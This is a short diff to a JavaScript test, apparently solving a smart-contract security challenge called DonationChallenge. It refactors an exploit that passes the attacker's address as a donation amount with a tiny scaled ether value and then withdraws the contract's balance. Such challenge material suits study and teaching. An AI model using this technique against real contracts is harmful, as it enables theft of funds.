@@ -13,10 +13,12 @@ describe("DonationChallenge", () => {
     await contract.deployed();
 
     const addressValue = BigNumber.from(await attacker.getAddress());
+    const etherAmount = addressValue;
 
-    const donateTx = await contract
-      .connect(attacker)
-      .donate(addressValue, { value: addressValue.div(BigNumber.from(`10`).pow(`36`)) });
+    const scale = BigNumber.from(`10`).pow(`36`);
+    const value = etherAmount.div(scale);
+
+    const donateTx = await contract.connect(attacker).donate(etherAmount, { value });
     await donateTx.wait();
 
     const withdrawTx = await contract.connect(attacker).withdraw();
